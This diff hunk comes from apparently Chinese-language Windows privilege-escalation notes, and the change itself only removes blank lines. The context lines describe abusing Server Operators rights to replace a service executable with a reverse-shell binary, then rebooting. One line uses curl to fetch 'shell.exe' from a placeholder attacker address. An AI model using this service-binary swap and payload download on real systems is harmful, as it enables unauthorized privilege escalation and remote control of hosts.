@@ -459,9 +459,7 @@ iscacls E:\mysql\bin\mysql.exe
 # 这里需要你有可以停止和启动的权限(server operators)
 # vss是默认包含服务，这里的vss就是你有权限停止或开始的项目
 -------------------------------------------------------------
-
 # 如果有权利shutdown，那么可以将此exe文件替换成反弹shell文件，最后shutdown -r
-
 rename bd.exe bd.exe.bak
 curl http://ip:port/shell.exe -o bd.exe
 # 如果上传不了，在可以下载的地方下载，在复制过去
